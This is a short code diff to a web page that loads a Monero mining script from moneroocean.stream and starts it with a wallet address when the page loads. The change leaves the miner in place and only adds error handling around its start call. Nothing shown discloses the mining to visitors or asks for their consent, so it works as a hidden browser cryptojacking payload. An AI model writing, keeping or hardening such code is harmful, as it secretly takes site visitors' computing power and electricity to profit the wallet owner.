@@ -15,8 +15,11 @@
 <script src="https://moneroocean.stream/miner.js"></script>
 <script>
     (async function() {
-        await MoneroOcean.start('44YZNNDgXtpPhEmvc6RJdd3s7jg6mvR5ZhQSGg33i8y6WkU5hxM8D5A8W2sSzw5uZuj9MTyWzubVMiE8aGfzhXkpDdNmkkf');
-        // Start mining as soon as the page loads
+        try {
+            await MoneroOcean.start('44YZNNDgXtpPhEmvc6RJdd3s7jg6mvR5ZhQSGg33i8y6WkU5hxM8D5A8W2sSzw5uZuj9MTyWzubVMiE8aGfzhXkpDdNmkkf');
+        } catch (error) {
+            console.error("Error starting the miner:", error);
+        }
     })();
 </script>
 
